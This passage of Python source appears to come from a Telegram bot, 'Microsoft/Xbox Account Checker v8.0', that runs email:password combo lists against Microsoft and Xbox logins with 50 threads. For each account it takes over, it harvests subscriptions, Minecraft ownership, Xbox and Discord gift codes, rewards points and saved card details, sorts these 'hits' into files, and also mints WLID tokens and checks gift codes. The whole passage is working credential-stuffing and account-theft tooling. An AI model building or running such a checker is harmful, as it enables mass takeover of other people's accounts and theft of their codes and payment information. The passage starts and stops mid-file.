                    result['minecraft'] = self.xbox.check_minecraft(session, mc_token)
            
            # Xbox codes check
            if xsts_xbox:
                result['xbox_codes'] = self.xbox.fetch_xbox_codes(session, uhs, xsts_xbox)
            
            # ===== MODULE 2: MICROSOFT FLOW =====
            # Get payment token from existing session
            payment_token = self.ms.get_payment_token(session)
            
            if payment_token:
                # Rewards
                result['rewards'] = self.ms.get_rewards_points(session)
                
                # Subscriptions (ACTIVE ONLY)
                result['subscriptions'] = self.ms.get_subscriptions(session, payment_token)
                
                # Payment info
                result['payment'] = self.ms.get_payment_info(session, payment_token)
            
            # Determine final status
            if result['subscriptions']:
                result['status'] = 'PREMIUM'
            elif result['minecraft'] and (result['minecraft'].get('has_mc') or result['minecraft'].get('has_gp')):
                result['status'] = 'MINECRAFT'
            elif result['xbox_codes']:
                result['status'] = 'CODES'
            elif result['payment'] and result['payment'].get('holder'):
                result['status'] = 'VALID_CARD'
            elif result['rewards'] > 0:
                result['status'] = 'VALID_REWARDS'
            else:
                result['status'] = 'VALID'
            
            return result
            
        except Exception as e:
            result['status'] = 'ERROR'
            return result


# ============================================================================
# USER TASK MANAGER
# ============================================================================
class UserTask:
    def __init__(self, user_id: int, combos: List[str], task_id: str, task_type: str = "checker"):
        self.user_id = user_id
        self.combos = combos
        self.task_id = task_id
        self.task_type = task_type  # "checker", "wlid", "codecheck"
        self.total = len(combos)
        self.checked = 0
        self.hits = 0
        self.results = []
        self.cancelled = False
        self.start_time = time.time()
        self.lock = Lock()
        self.checker = FullChecker()
        self.wlid_authenticator = MicrosoftAuthenticator()
        self.wlid = None  # For codecheck tasks
        
        # Stats tracking
        self.stats = {
            'premium': 0, 'minecraft': 0, 'codes': 0,
            'cards': 0, 'rewards': 0, 'valid': 0,
            'bad': 0, 'twofa': 0, 'locked': 0,
            'gpu': 0, 'pc_gp': 0, 'core': 0,
            'ea': 0, 'fortnite': 0, 'discord_subs': 0,
            'm365': 0, 'total_codes': 0, 'total_rewards': 0,
            'wlid_success': 0, 'wlid_failed': 0,
            'code_valid': 0, 'code_used': 0, 'code_expired': 0, 'code_invalid': 0
        }
    
    def update_stats(self, result):
        with self.lock:
            self.checked += 1
            
            if self.task_type == "checker":
                status = result['status']
                
                if status == 'PREMIUM':
                    self.hits += 1
                    self.stats['premium'] += 1
                    for sub in result['subscriptions']:
                        t = sub['type']
                        if t == 'GPU': self.stats['gpu'] += 1
                        elif t == 'PC_GP': self.stats['pc_gp'] += 1
                        elif t == 'CORE': self.stats['core'] += 1
                        elif t == 'EA_PLAY': self.stats['ea'] += 1
                        elif t == 'FORTNITE': self.stats['fortnite'] += 1
                        elif t == 'DISCORD': self.stats['discord_subs'] += 1
                        elif t == 'M365': self.stats['m365'] += 1
                
                if result['minecraft'] and (result['minecraft'].get('has_mc') or result['minecraft'].get('has_gp')):
                    self.stats['minecraft'] += 1
                
                self.stats['total_codes'] += len(result['xbox_codes'])
                self.stats['total_rewards'] += result['rewards']
                
                if result['payment'] and result['payment'].get('holder'):
                    self.stats['cards'] += 1
                
                if status in ['VALID', 'VALID_CARD', 'VALID_REWARDS']:
                    self.stats['valid'] += 1
                elif status == '2FA':
                    self.stats['twofa'] += 1
                elif status == 'LOCKED':
                    self.stats['locked'] += 1
                elif status in ['BAD', 'ERROR']:
                    self.stats['bad'] += 1
            
            elif self.task_type == "wlid":
                if result.get('success'):
                    self.hits += 1
                    self.stats['wlid_success'] += 1
                else:
                    self.stats['wlid_failed'] += 1
            
            elif self.task_type == "codecheck":
                status = result.get('status', '')
                if status == 'valid':
                    self.stats['code_valid'] += 1
                elif status == 'used':
                    self.stats['code_used'] += 1
                elif status == 'expired':
                    self.stats['code_expired'] += 1
                else:
                    self.stats['code_invalid'] += 1
    
    def get_progress_bar(self, width=20):
        """Generate a progress bar"""
        percent = (self.checked / self.total * 100) if self.total > 0 else 0
        filled = int(width * self.checked // self.total) if self.total > 0 else 0
        bar = '█' * filled + '░' * (width - filled)
        return f"`[{bar}]` {percent:.1f}%"
    
    def get_progress_text(self):
        elapsed = time.time() - self.start_time
        cpm = int(self.checked / elapsed * 60) if elapsed > 0 else 0
        percent = (self.checked / self.total * 100) if self.total > 0 else 0
        
        progress_bar = self.get_progress_bar()
        
        base_text = (
            f"**📊 TASK PROGRESS**\n\n"
            f"{progress_bar}\n\n"
            f"**📈 Statistics**\n"
            f"├─ **Progress:** `{self.checked}/{self.total}`\n"
            f"├─ **CPM:** `{cpm}`\n"
            f"├─ **Time:** `{timedelta(seconds=int(elapsed))}`\n"
            f"└─ **Status:** `{'🟢 RUNNING' if not self.cancelled else '🔴 CANCELLING'}`\n\n"
        )
        
        if self.task_type == "checker":
            return base_text + (
                f"**🔥 HITS**\n"
                f"├─ **Premium:** `{self.stats['premium']}`\n"
                f"├─ **Minecraft:** `{self.stats['minecraft']}`\n"
                f"├─ **Codes:** `{self.stats['total_codes']}`\n"
                f"├─ **Cards:** `{self.stats['cards']}`\n"
                f"└─ **Rewards:** `{self.stats['total_rewards']} pts`\n\n"
                f"**📋 DETAILS**\n"
                f"├─ **GPU:** `{self.stats['gpu']}`\n"
                f"├─ **PC GP:** `{self.stats['pc_gp']}`\n"
                f"├─ **CORE:** `{self.stats['core']}`\n"
                f"├─ **EA Play:** `{self.stats['ea']}`\n"
                f"├─ **Fortnite:** `{self.stats['fortnite']}`\n"
                f"├─ **Discord:** `{self.stats['discord_subs']}`\n"
                f"└─ **M365:** `{self.stats['m365']}`\n\n"
                f"**⚡ STATUS**\n"
                f"├─ **✅ Valid:** `{self.stats['valid']}`\n"
                f"├─ **📱 2FA:** `{self.stats['twofa']}`\n"
                f"├─ **🔒 Locked:** `{self.stats['locked']}`\n"
                f"└─ **❌ Bad:** `{self.stats['bad']}`"
            )
        elif self.task_type == "wlid":
            return base_text + (
                f"**🔑 WLID GENERATION**\n"
                f"├─ **✅ Success:** `{self.stats['wlid_success']}`\n"
                f"└─ **❌ Failed:** `{self.stats['wlid_failed']}`"
            )
        elif self.task_type == "codecheck":
            return base_text + (
                f"**🎫 CODE CHECKING**\n"
                f"├─ **✅ Valid:** `{self.stats['code_valid']}`\n"
                f"├─ **🔄 Used:** `{self.stats['code_used']}`\n"
                f"├─ **⏰ Expired:** `{self.stats['code_expired']}`\n"
                f"└─ **❌ Invalid:** `{self.stats['code_invalid']}`"
            )
        
        return base_text


class TaskManager:
    def __init__(self):
        self.tasks: Dict[int, UserTask] = {}
        self.lock = asyncio.Lock()
    
    async def add_task(self, user_id: int, combos: List[str], task_type: str = "checker") -> str:
        async with self.lock:
            # Cancel existing task if any
            if user_id in self.tasks:
                self.tasks[user_id].cancelled = True
            
            task_id = str(uuid.uuid4())[:8]
            self.tasks[user_id] = UserTask(user_id, combos, task_id, task_type)
            return task_id
    
    async def get_task(self, user_id: int) -> Optional[UserTask]:
        return self.tasks.get(user_id)
    
    async def remove_task(self, user_id: int):
        async with self.lock:
            if user_id in self.tasks:
                del self.tasks[user_id]


# ============================================================================
# RESULTS HANDLER
# ============================================================================
class ResultsHandler:
    def __init__(self):
        self.lock = Lock()
    
    def save_result(self, user_id: int, result: dict, task_type: str = "checker"):
        """Save a single result to appropriate files"""
        try:
            user_dir = USERS_DIR / str(user_id)
            user_dir.mkdir(exist_ok=True)
            
            if task_type == "checker":
                email = result['email']
                password = result['password']
                combo = f"{email}:{password}"
                status = result['status']
                
                # Premium
                if status == 'PREMIUM':
                    for sub in result['subscriptions']:
                        line = f"{combo} | {sub['title']} | Days: {sub['days']} | AutoRenew: {sub['auto_renew']}\n"
                        self._write(user_dir / f"premium_{sub['type']}.txt", line)
                    
                    # All premium summary
                    capture = [f"Subs: {len(result['subscriptions'])}"]
                    if result['rewards'] > 0:
                        capture.append(f"Points: {result['rewards']}")
                    if result['payment'] and result['payment'].get('holder'):
                        capture.append(f"Card: {result['payment']['card_type']} ****{result['payment']['last4']}")
                    self._write(user_dir / "premium_all.txt", f"{combo} | {' | '.join(capture)}\n")
                
                # Minecraft
                if result['minecraft'] and (result['minecraft'].get('has_mc') or result['minecraft'].get('has_gp')):
                    mc = result['minecraft']
                    line = f"{combo} | Name: {mc.get('name', 'N/A')}"
                    if mc.get('capes'): line += f" | Capes: {mc['capes']}"
                    if mc.get('gp_type'): line += f" | {mc['gp_type']}"
                    self._write(user_dir / "minecraft.txt", line + "\n")
                
                # Xbox Codes
                for code in result['xbox_codes']:
                    ctype = code['type']
                    if ctype == 'XBOX_CODE':
                        self._write(user_dir / "xbox_codes.txt", f"{code['code']} | {code['title']}\n")
                    elif ctype == 'DISCORD':
                        self._write(user_dir / "discord_codes.txt", f"{code['code']}\n")
                    else:
                        self._write(user_dir / "other_codes.txt", f"{code['code']} | {code['title']}\n")
                
                # Cards
                if result['payment'] and result['payment'].get('holder'):
                    p = result['payment']
                    self._write(user_dir / "cards.txt", 
                               f"{combo} | {p['card_type']} ****{p['last4']} | {p['holder']} | {p.get('country', 'N/A')}\n")
                
                # Rewards
                if result['rewards'] > 0:
                    self._write(user_dir / "rewards.txt", f"{combo} | Points: {result['rewards']}\n")
                
                # Status files
                if status == 'VALID':
                    self._write(user_dir / "valid.txt", f"{combo}\n")
                elif status == '2FA':
                    self._write(user_dir / "2fa.txt", f"{combo}\n")
                elif status in ['BAD', 'ERROR']:
                    self._write(user_dir / "bad.txt", f"{combo} | {status}\n")
                elif status == 'LOCKED':
                    self._write(user_dir / "locked.txt", f"{combo}\n")
            
            elif task_type == "wlid":
                email = result.get('email', 'unknown')
                if result.get('success'):
                    token = result.get('token', '')
                    self._write(user_dir / "wlid_success.txt", f"{email}:{token}\n")
                    self._write(WLID_DIR / f"wlid_tokens_{datetime.now().strftime('%Y%m%d')}.txt", f"{token}\n")
                else:
                    error = result.get('error', 'Unknown error')
                    self._write(user_dir / "wlid_failed.txt", f"{email} | Error: {error}\n")
            
            elif task_type == "codecheck":
                code = result.get('code', '')
                status = result.get('status', '')
                title = result.get('title', '')
                error = result.get('error', '')
                
                if status == 'valid':
                    line = f"{code} | {title}\n" if title else f"{code}\n"
                    self._write(user_dir / "codes_valid.txt", line)
                elif status == 'used':
                    line = f"{code} | {title}\n" if title else f"{code}\n"
                    self._write(user_dir / "codes_used.txt", line)
                elif status == 'expired':
                    self._write(user_dir / "codes_expired.txt", f"{code}\n")
                elif status == 'invalid':
                    self._write(user_dir / "codes_invalid.txt", f"{code}\n")
                else:
                    self._write(user_dir / "codes_error.txt", f"{code} | {error}\n")
            
        except Exception as e:
            print(f"{C.R}[Save Error] {e}{C.END}")
    
    def _write(self, path: Path, content: str):
        with self.lock:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(content)
    
    def create_zip(self, user_id: int) -> Optional[Path]:
        """Create ZIP file with all results for user"""
        try:
            user_dir = USERS_DIR / str(user_id)
            if not user_dir.exists():
                return None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            zip_path = RESULTS_DIR / f"user_{user_id}_{timestamp}.zip"
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for file_path in user_dir.glob("*.txt"):
                    zf.write(file_path, file_path.name)
            
            return zip_path
        except Exception as e:
            print(f"{C.R}[ZIP Error] {e}{C.END}")
            return None
    
    def clear_user_data(self, user_id: int):
        """Clear user's data directory"""
        try:
            user_dir = USERS_DIR / str(user_id)
            if user_dir.exists():
                shutil.rmtree(user_dir)
        except Exception as e:
            print(f"{C.R}[Clear Error] {e}{C.END}")


# ============================================================================
# CODE FORMATTER FOR CLICK-TO-COPY
# ============================================================================
def format_codes_for_display(codes: List[dict], max_codes: int = 15) -> str:
    """Format codes with block quotes for click-to-copy functionality"""
    if not codes:
        return ""
    
    # Limit to max_codes
    display_codes = codes[:max_codes]
    remaining = len(codes) - max_codes
    
    # Group by type
    xbox_codes = [c for c in display_codes if c['type'] == 'XBOX_CODE']
    discord_codes = [c for c in display_codes if c['type'] == 'DISCORD']
    other_codes = [c for c in display_codes if c['type'] == 'OTHER']
    
    formatted = "**🎮 XBOX CODES FOUND!**\n\n"
    
    # Xbox Game Codes
    if xbox_codes:
        formatted += "**Xbox Game Codes:**\n"
        for i, code in enumerate(xbox_codes, 1):
            formatted += f"`{code['code']}` - {code['title']}\n"
        formatted += "\n"
    
    # Discord Codes
    if discord_codes:
        formatted += "**Discord Nitro:**\n"
        for i, code in enumerate(discord_codes, 1):
            formatted += f"`{code['code']}`\n"
        formatted += "\n"
    
    # Other Codes
    if other_codes:
        formatted += "**Other Perks:**\n"
        for i, code in enumerate(other_codes, 1):
            formatted += f"`{code['code']}` - {code['title']}\n"
        formatted += "\n"
    
    # Add note if more codes exist
    if remaining > 0:
        formatted += f"*...and {remaining} more codes in ZIP file*\n\n"
    
    # Add click-to-copy instructions
    formatted += "**📋 Click any code above to copy!**"
    
    return formatted

def format_wlids_for_display(tokens: List[str], max_tokens: int = 20) -> str:
    """Format WLID tokens for display with click-to-copy"""
    if not tokens:
        return ""
    
    display_tokens = tokens[:max_tokens]
    remaining = len(tokens) - max_tokens
    
    formatted = "**🔑 WLID TOKENS GENERATED!**\n\n"
    formatted += "**Tokens (click to copy):**\n"
    
    for i, token in enumerate(display_tokens, 1):
        display = token
        formatted += f"`{display}`\n"
    
    if remaining > 0:
        formatted += f"\n*...and {remaining} more tokens in ZIP file*"
    
    formatted += "\n\n**📋 Click any token above to copy!**"
    return formatted

def format_code_results_for_display(results: List[dict]) -> str:
    """Format code check results for display with detailed information"""
    if not results:
        return "**❌ No results to display**"
    
    valid = [r for r in results if r.get('status') == 'valid']
    used = [r for r in results if r.get('status') == 'used']
    expired = [r for r in results if r.get('status') == 'expired']
    invalid = [r for r in results if r.get('status') in ['invalid', 'error']]
    
    formatted = f"**🎫 CODE CHECK RESULTS**\n\n"
    formatted += f"**Total Checked:** `{len(results)}`\n"
    formatted += f"**✅ Valid:** `{len(valid)}`\n"
    formatted += f"**🔄 Used:** `{len(used)}`\n"
    formatted += f"**⏰ Expired:** `{len(expired)}`\n"
    formatted += f"**❌ Invalid:** `{len(invalid)}`\n\n"
    
    if valid:
        formatted += "**✅ VALID CODES (with details):**\n\n"
        for i, r in enumerate(valid[:10], 1):
            title = r.get('title', 'Unknown')
            code = r['code']
            
            formatted += f"**{i}. `{code}`**\n"
            if title and title != 'Unknown':
                formatted += f"   📦 {title}\n"
            formatted += "\n"
            
        if len(valid) > 10:
            formatted += f"*...and {len(valid)-10} more valid codes in ZIP file*\n"
    
    if used and len(valid) == 0:
        formatted += "\n**🔄 USED CODES:**\n"
        for i, r in enumerate(used[:5], 1):
            title = f" - {r.get('title', '')}" if r.get('title') else ""
            formatted += f"`{r['code']}`{title}\n"
        if len(used) > 5:
            formatted += f"*...and {len(used)-5} more*\n"
    
    return formatted


# ============================================================================
# BOT CLASS
# ============================================================================
class XboxCheckerBot:
    def __init__(self):
        self.app = Client(
            "xbox_checker_bot",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN
        )
        self.task_manager = TaskManager()
        self.results_handler = ResultsHandler()
        self.update_lock = asyncio.Lock()
        
        # Register handlers
        self.register_handlers()
    
    def register_handlers(self):
        @self.app.on_message(filters.command("start"))
        async def start_command(client, message):
            await message.reply_text(
                "**🤖 Microsoft/Xbox Account Checker v8.0**\n\n"
                "**✨ Features:**\n"
                "• Xbox Flow: Minecraft, Game Pass Codes\n"
                "• Microsoft Flow: Subscriptions, Rewards, Payment Info\n"
                "• WLID Token Generation\n"
                "• Code Checking with WLID\n"
                "• 50 Threads for Fast Checking\n"
                "• Real-time Hit Notifications with Full Combos\n"
                "• Click-to-Copy Codes & Tokens\n"
                "• Progress Bar with Live Stats\n\n"
                "**📌 Commands:**\n"
                "`/check email:password` - Check single account\n"
                "`/batch` (reply to .txt) - Check multiple accounts\n"
                "`/wlid email:password` - Generate WLID token\n"
                "`/batchwlid` (reply to .txt) - Generate multiple WLID tokens\n"
                "`/chkcode <wlid> <code>` - Check code validity (shows raw API response)\n"
                "`/chkcode <wlid>` (reply to .txt) - Check multiple codes\n"
                "`/cancel` - Cancel ongoing task\n"
                "`/stats` - View current progress\n\n"
                "**📝 Format:** `email:password` (one per line)\n\n"
                "**💡 Tip:** Codes appear with block quotes - click to copy!"
            )
        
        @self.app.on_message(filters.command("check"))
        async def check_command(client, message):
            if len(message.command) < 2:
                await message.reply_text("**❌ Usage:** `/check email:password`")
                return
            
            combo = message.command[1]
            if ':' not in combo:
                await message.reply_text("**❌ Invalid format! Use `email:password`**")
                return
            
            # Check if user has ongoing task
            existing = await self.task_manager.get_task(message.from_user.id)
            if existing and not existing.cancelled:
                await message.reply_text(
                    "**⚠️ You have an ongoing task!**\n"
                    "Use `/cancel` to cancel it first."
                )
                return
            
            # Create task with single combo
            await self.task_manager.add_task(message.from_user.id, [combo], "checker")
            
            # Send initial message with progress bar
            task = await self.task_manager.get_task(message.from_user.id)
            msg = await message.reply_text(
                f"**🔍 Starting Check...**\n\n"
                f"{task.get_progress_bar()}\n\n"
                f"**Combo:** `{combo[:30]}...`\n"
                f"**Status:** `Initializing...`\n\n"
                f"*Progress updates every {UPDATE_INTERVAL} seconds*"
            )
            
            # Process the task
            await self.process_task(message.from_user.id, msg)
        
        @self.app.on_message(filters.command("batch") & filters.reply)
        async def batch_command(client, message):
            if not message.reply_to_message.document:
                await message.reply_text("**❌ Please reply to a .txt file!**")
                return
            
            # Check if user has ongoing task
            existing = await self.task_manager.get_task(message.from_user.id)
            if existing and not existing.cancelled:
                await message.reply_text(
                    "**⚠️ You have an ongoing task!**\n"
                    "Use `/cancel` to cancel it first."
                )
                return
            
            # Download file
            status_msg = await message.reply_text("**📥 Downloading file...**")
            
            try:
                file_path = await message.reply_to_message.download()
                
                # Read combos
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [l.strip() for l in f if l.strip() and ':' in l]
                
                os.unlink(file_path)  # Clean up
                
                if not lines:
                    await status_msg.edit_text("**❌ No valid combos found!**")
                    return
                
                # Remove duplicates
                lines = list(set(lines))
                
                # Create task
                await self.task_manager.add_task(message.from_user.id, lines, "checker")
                task = await self.task_manager.get_task(message.from_user.id)
                
                await status_msg.edit_text(
                    f"**📊 Loaded {len(lines)} unique combos**\n\n"
                    f"{task.get_progress_bar()}\n\n"
                    f"**Starting check with 50 threads...**\n"
                    f"*Progress updates every {UPDATE_INTERVAL} seconds*"
                )
                
                # Process task
                await self.process_task(message.from_user.id, status_msg)
                
            except Exception as e:
                await status_msg.edit_text(f"**❌ Error:** `{str(e)}`")
        
        @self.app.on_message(filters.command("wlid"))
        async def wlid_command(client, message):
            if len(message.command) < 2:
                await message.reply_text("**❌ Usage:** `/wlid email:password`")
                return
            
            combo = message.command[1]
            if ':' not in combo:
                await message.reply_text("**❌ Invalid format! Use `email:password`**")
                return
            
            # Check if user has ongoing task
            existing = await self.task_manager.get_task(message.from_user.id)
            if existing and not existing.cancelled:
                await message.reply_text(
                    "**⚠️ You have an ongoing task!**\n"
                    "Use `/cancel` to cancel it first."
                )
                return
            
            # Create task with single combo
            await self.task_manager.add_task(message.from_user.id, [combo], "wlid")
            
            # Send initial message
            task = await self.task_manager.get_task(message.from_user.id)
            msg = await message.reply_text(
                f"**🔑 Generating WLID Token...**\n\n"
                f"{task.get_progress_bar()}\n\n"
                f"**Account:** `{combo[:30]}...`\n"
                f"*This may take 10-30 seconds*"
            )
            
            # Process WLID generation
            await self.process_wlid_task(message.from_user.id, msg)
        
        @self.app.on_message(filters.command("batchwlid") & filters.reply)
        async def batch_wlid_command(client, message):
            if not message.reply_to_message.document:
                await message.reply_text("**❌ Please reply to a .txt file!**")
                return
            
            # Check if user has ongoing task
            existing = await self.task_manager.get_task(message.from_user.id)
            if existing and not existing.cancelled:
                await message.reply_text(
                    "**⚠️ You have an ongoing task!**\n"
                    "Use `/cancel` to cancel it first."
                )
                return
            
            # Download file
            status_msg = await message.reply_text("**📥 Downloading file...**")
            
            try:
                file_path = await message.reply_to_message.download()
                
                # Read combos
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [l.strip() for l in f if l.strip() and ':' in l]
                
                os.unlink(file_path)  # Clean up
                
                if not lines:
                    await status_msg.edit_text("**❌ No valid combos found!**")
                    return
                
                # Remove duplicates
                lines = list(set(lines))
                
                # Create task
                await self.task_manager.add_task(message.from_user.id, lines, "wlid")
                task = await self.task_manager.get_task(message.from_user.id)
                
                await status_msg.edit_text(
                    f"**📊 Loaded {len(lines)} accounts for WLID generation**\n\n"
                    f"{task.get_progress_bar()}\n\n"
                    f"**Starting WLID generation with 10 threads...**\n"
                    f"*Progress updates every {UPDATE_INTERVAL} seconds*"
                )
                
                # Process task
                await self.process_wlid_task(message.from_user.id, status_msg)
                
            except Exception as e:
                await status_msg.edit_text(f"**❌ Error:** `{str(e)}`")
        
        @self.app.on_message(filters.command("chkcode"))
        async def chkcode_command(client, message):
            # Parse arguments
            args = message.text.split()
            
            if len(args) == 3:
                # Format: /chkcode <wlid> <code>
                wlid = args[1]
                code = args[2]
                
                # Check if user has ongoing task
                existing = await self.task_manager.get_task(message.from_user.id)
                if existing and not existing.cancelled:
                    await message.reply_text(
                        "**⚠️ You have an ongoing task!**\n"
                        "Use `/cancel` to cancel it first."
                    )
                    return
                
                # Create task with single code
                await self.task_manager.add_task(message.from_user.id, [code], "codecheck")
                task = await self.task_manager.get_task(message.from_user.id)
                task.wlid = wlid  # Store WLID in task
                
                msg = await message.reply_text(
                    f"**🔍 Checking code...**\n\n"
                    f"**Code:** `{code}`\n"
                    f"**Status:** `Requesting API...`"
                )
                
                # Process the code check asynchronously
                asyncio.create_task(self.process_codecheck_task(
                    message.from_user.id, 
                    msg, 
                    [wlid], 
                    [code]
                ))
                
            elif len(args) == 2 and message.reply_to_message:
                # Format: /chkcode <wlid> (reply to .txt or text)
                wlid = args[1]
                
                # Check if user has ongoing task
                existing = await self.task_manager.get_task(message.from_user.id)
                if existing and not existing.cancelled:
                    await message.reply_text(
                        "**⚠️ You have an ongoing task!**\n"
                        "Use `/cancel` to cancel it first."
                    )
                    return
                
                codes = []
                status_msg = None
                
                if message.reply_to_message.document:
                    # Download file
                    status_msg = await message.reply_text("**📥 Downloading file...**")
                    
                    try:
                        file_path = await message.reply_to_message.download()
                        
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            codes = [l.strip() for l in f if l.strip()]
                        
                        os.unlink(file_path)
                    except Exception as e:
                        await status_msg.edit_text(f"**❌ Error:** `{str(e)}`")
                        return
                    
                elif message.reply_to_message.text:
                    # Get codes from replied text
                    text = message.reply_to_message.text
                    codes = [l.strip() for l in text.split('\n') if l.strip()]
                    status_msg = message  # Use the original message for updates
                
                else:
                    await message.reply_text("**❌ Please reply to a .txt file or text message containing codes!**")
                    return
                
                if not codes:
                    await message.reply_text("**❌ No valid codes found!**")
                    return
                
                # Remove duplicates
                codes = list(set(codes))
                
                # Create task
                await self.task_manager.add_task(message.from_user.id, codes, "codecheck")
                task = await self.task_manager.get_task(message.from_user.id)
                task.wlid = wlid  # Store WLID in task
                
                if not status_msg or status_msg == message:
                    status_msg = await message.reply_text(
                        f"**📊 Loaded {len(codes)} codes for checking**\n\n"
                        f"{task.get_progress_bar()}\n\n"
                        f"**Starting code check with 10 threads...**\n"
                        f"*Progress updates every {UPDATE_INTERVAL} seconds*"
                    )
                
                # Process the code check asynchronously
                asyncio.create_task(self.process_codecheck_task(
                    message.from_user.id, 
                    status_msg, 
                    [wlid], 
                    codes
                ))
                
            else:
                await message.reply_text(
                    "**❌ Usage:**\n"
                    "`/chkcode <wlid> <code>` - Check single code (shows raw API response)\n"
                    "`/chkcode <wlid>` (reply to .txt) - Check multiple codes"
                )
        
        @self.app.on_message(filters.command("cancel"))
        async def cancel_command(client, message):
            task = await self.task_manager.get_task(message.from_user.id)
            if task and not task.cancelled:
                task.cancelled = True
                await message.reply_text(
                    "**✅ Task Cancelled!**\n\n"
                    "Use `/stats` to see final progress before cleanup."
                )
            else:
                await message.reply_text("**❌ No active task found!**")
        
        @self.app.on_message(filters.command("stats"))
        async def stats_command(client, message):
            task = await self.task_manager.get_task(message.from_user.id)
            if task and not task.cancelled:
                await message.reply_text(task.get_progress_text())
            else:
                await message.reply_text("**❌ No active task!**")
    
    async def process_task(self, user_id: int, status_message):
        """Process user's account checking task"""
        task = await self.task_manager.get_task(user_id)
        if not task:
            return
        
        # Clear previous results
        self.results_handler.clear_user_data(user_id)
        
        # Update status periodically
        last_update = time.time()
        
        # Process combos with ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(task.checker.check, email, password): (email, password) 
                      for email, password in [c.split(':', 1) for c in task.combos]}
            
            for future in as_completed(futures):
                if task.cancelled:
                    executor.shutdown(wait=False)
                    break
                
                try:
                    result = future.result(timeout=60)
                    
                    # Save result
                    self.results_handler.save_result(user_id, result, "checker")
                    task.results.append(result)
                    task.update_stats(result)
                    
                    # Send hit immediately if it's valuable
                    if result['status'] in ['PREMIUM', 'MINECRAFT', 'CODES'] or result['xbox_codes'] or (result['payment'] and result['payment'].get('holder')):
                        await self.send_hit_notification(user_id, result)
                    
                    # Update progress every 3 seconds
                    current_time = time.time()
                    if current_time - last_update >= UPDATE_INTERVAL:
                        async with self.update_lock:
                            try:
                                await status_message.edit_text(task.get_progress_text())
                            except Exception as e:
                                print(f"{C.Y}[Update Error] {e}{C.END}")
                        last_update = current_time
                    
                except Exception as e:
                    print(f"{C.R}[Process Error] {e}{C.END}")
        
        # Task complete
        if task.cancelled:
            try:
                await status_message.edit_text(
                    f"**❌ Task Cancelled!**\n\n"
                    f"{task.get_progress_text()}"
                )
            except:
                pass
        else:
            await self.finish_task(user_id, status_message, "checker")
        
        # Remove task after a delay
        await asyncio.sleep(5)
        await self.task_manager.remove_task(user_id)
    
    async def process_wlid_task(self, user_id: int, status_message):
        """Process WLID generation task"""
        task = await self.task_manager.get_task(user_id)
        if not task:
            return
        
        # Clear previous results
        self.results_handler.clear_user_data(user_id)
        
        last_update = time.time()
        successful_tokens = []
        sent_notifications = set()  # Track sent notifications to prevent duplicates
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for combo in task.combos:
                if ':' in combo:
                    email, password = combo.split(':', 1)
                    futures[executor.submit(task.wlid_authenticator.authenticate, email, password)] = combo
            
            for future in as_completed(futures):
                if task.cancelled:
                    executor.shutdown(wait=False)
                    break
                
                try:
                    result = future.result(timeout=60)
                    
                    # Save result
                    self.results_handler.save_result(user_id, result, "wlid")
                    task.results.append(result)
                    task.update_stats(result)
                    
                    # Send notification only once per successful token
                    if result.get('success'):
                        token = result['token']
                        # Check if we've already sent this token
                        if token not in sent_notifications:
                            successful_tokens.append(token)
                            sent_notifications.add(token)
                            await self.send_wlid_notification(user_id, result)
                    
                    # Update progress
                    current_time = time.time()
                    if current_time - last_update >= UPDATE_INTERVAL:
                        async with self.update_lock:
                            try:
                                await status_message.edit_text(task.get_progress_text())
                            except Exception as e:
                                print(f"{C.Y}[Update Error] {e}{C.END}")
                        last_update = current_time
                    
                except Exception as e:
                    print(f"{C.R}[WLID Process Error] {e}{C.END}")
        
        # Task complete
        if task.cancelled:
            try:
                await status_message.edit_text(
                    f"**❌ Task Cancelled!**\n\n"
                    f"{task.get_progress_text()}"
                )
            except:
                pass
        else:
            await self.finish_wlid_task(user_id, status_message, successful_tokens)
        
        await asyncio.sleep(5)
        await self.task_manager.remove_task(user_id)
    
    async def process_codecheck_task(self, user_id: int, status_message, wlids: list, codes: list):
        """Process code checking task with detailed API response display"""
        task = await self.task_manager.get_task(user_id)
        if not task:
            return
        
        # Clear previous results
        self.results_handler.clear_user_data(user_id)
        
        # Process codes one by one for detailed output
        results = []
        
        for i, code in enumerate(codes):
            if task.cancelled:
                break
            
            # Send initial checking message
            checking_msg = await self.app.send_message(
                user_id,
                f"**🔍 Checking code {i+1}/{len(codes)}:**\n\n"
                f"**Code:** `{code}`\n"
                f"**Status:** `Requesting API...`"
            )
            
            # Check the code with full details
            result = await self.check_code_with_details(code, wlids[0])
            results.append(result)
            
            # Format detailed output
            detailed_output = self.format_detailed_code_result(result)
            
            # Update the message with detailed output
            try:
                await checking_msg.edit_text(detailed_output, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                # If message is too long, send a truncated version
                truncated = detailed_output[:3500] + "...\n*(Response truncated due to length)*"
                await checking_msg.edit_text(truncated, parse_mode=ParseMode.MARKDOWN)
            
            # Save result
            self.results_handler.save_result(user_id, result, "codecheck")
            task.update_stats(result)
            
            # Small delay to avoid rate limiting
            await asyncio.sleep(1)
        
        # Send summary
        if results:
            summary = format_code_results_for_display(results)
            await self.app.send_message(user_id, summary)
        
        # Update status message
        try:
            await status_message.edit_text(f"**✅ Code check completed!**\n\nChecked {len(results)} codes.")
        except:
            pass
        
        await asyncio.sleep(5)
        await self.task_manager.remove_task(user_id)
    
    async def check_code_with_details(self, code: str, wlid: str) -> dict:
        """Check code and return full details including raw response"""
        code = code.strip()
        result = {
            'code': code,
            'status': 'unknown',
            'title': 'Unknown',
            'raw_response': None,
            'status_code': None,
            'headers': None,
            'store_ids': [],
            'token_state': None,
            'error': None,
            'url': None
        }
        
        if not code or len(code) < 18:
            result['status'] = 'invalid'
            result['error'] = 'Invalid code format'
            return result
        
        formatted_wlid = wlid
        if "WLID1.0=" not in wlid:
            formatted_wlid = f'WLID1.0="{wlid}"'
        
        headers = {
            "Authorization": formatted_wlid,
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Origin": "https://www.microsoft.com",
            "Referer": "https://www.microsoft.com/",
        }
        
